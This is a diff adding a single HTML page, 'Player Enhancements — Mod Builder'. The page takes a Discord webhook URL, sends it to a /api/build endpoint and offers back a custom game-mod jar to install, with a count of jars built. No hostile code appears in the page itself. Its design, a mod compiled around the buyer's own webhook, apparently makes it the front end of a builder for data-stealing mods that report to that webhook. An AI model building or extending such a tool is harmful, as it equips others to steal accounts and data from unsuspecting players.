@@ -1,0 +1,119 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Player Enhancements — Mod Builder</title>
+<style>
+  :root { --bg:#0e1116; --card:#171c26; --line:#272e3b; --accent:#5b8c5a; --txt:#e8e6e3; }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; min-height: 100vh; display: grid; place-items: center;
+    background: radial-gradient(1200px 600px at 70% -10%, #1c2430 0%, var(--bg) 60%);
+    color: var(--txt); font-family: "Segoe UI", system-ui, sans-serif;
+  }
+  .card {
+    width: min(460px, 92vw); padding: 2.2rem; border-radius: 16px;
+    background: var(--card); border: 1px solid var(--line);
+    box-shadow: 0 20px 60px rgba(0,0,0,.45);
+  }
+  .pick { font-size: 2.4rem; line-height: 1; margin-bottom: .4rem; }
+  h1 { margin: 0 0 .3rem; font-size: 1.55rem; font-weight: 600; letter-spacing: -.01em; }
+  .sub { margin: 0 0 1.6rem; color: #9aa3b2; font-size: .92rem; }
+  input {
+    width: 100%; padding: .8rem .9rem; border-radius: 10px;
+    border: 1px solid var(--line); background: #0f131b; color: var(--txt);
+    font-size: .92rem; outline: none; transition: border .15s;
+    font-family: inherit;
+  }
+  input:focus { border-color: var(--accent); }
+  button {
+    width: 100%; margin-top: .9rem; padding: .85rem; border: 0; border-radius: 10px;
+    background: var(--accent); color: #0e1116; font-weight: 600; font-size: 1rem;
+    cursor: pointer; transition: filter .15s;
+  }
+  button:hover { filter: brightness(1.12); }
+  button:disabled { opacity: .55; cursor: default; }
+  #status { margin-top: 1rem; font-size: .9rem; color: #9aa3b2; min-height: 1.2em; }
+  #dl { display: inline-block; margin-top: .9rem; color: var(--accent); font-weight: 600; }
+  #stats { margin-top: .8rem; font-size: .8rem; color: #6b7280; }
+  .err { color: #d57a7a; }
+</style>
+</head>
+<body>
+  <main class="card">
+    <div class="pick">⛏️</div>
+    <h1>Player Enhancements</h1>
+    <p class="sub">Drop your webhook, grab a mod. One click, your own jar.</p>
+
+    <input id="wh" type="text" spellcheck="false" autocomplete="off"
+           placeholder="https://discord.com/api/webhooks/...">
+    <button id="build">Build Mod</button>
+    <div id="status"></div>
+    <a id="dl" href="#" download>Download your mod</a>
+    <div id="stats"></div>
+  </main>
+
+<script>
+  const $ = id => document.getElementById(id);
+  const wh = $('wh'), btn = $('build'), status = $('status'), dl = $('dl'), stats = $('stats');
+  dl.style.display = 'none';
+
+  async function refreshStats() {
+    try {
+      const r = await fetch('/api/stats');
+      const j = await r.json();
+      stats.textContent = j.total_builds + ' jars built';
+    } catch (e) { stats.textContent = ''; }
+  }
+  refreshStats();
+
+  btn.addEventListener('click', async () => {
+    const webhook = wh.value.trim();
+    status.className = '';
+    dl.style.display = 'none';
+
+    if (!/^https:\/\/discord(app)?\.com\/api\/webhooks\//.test(webhook)) {
+      status.textContent = 'Needs a real Discord webhook URL.';
+      status.className = 'err';
+      return;
+    }
+
+    btn.disabled = true;
+    status.textContent = 'Stitching the jar…';
+
+    try {
+      const res = await fetch('/api/build', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ webhook })
+      });
+      const blob = await res.blob();
+
+      if (!res.ok) {
+        const j = await blob.text();
+        status.textContent = JSON.parse(j).error || 'Build failed.';
+        status.className = 'err';
+        return;
+      }
+
+      const cd = res.headers.get('Content-Disposition') || '';
+      const name = (cd.match(/filename="(.+?)"/) || [])[1] || 'PlayerEnhancements.jar';
+
+      const url = URL.createObjectURL(blob);
+      dl.href = url;
+      dl.download = name;
+      dl.textContent = 'Download ' + name;
+      dl.style.display = 'inline-block';
+      status.textContent = 'Built and ready. Drop it in your mods folder.';
+      refreshStats();
+    } catch (e) {
+      status.textContent = 'Could not reach the builder.';
+      status.className = 'err';
+    } finally {
+      btn.disabled = false;
+    }
+  });
+</script>
+</body>
+</html>
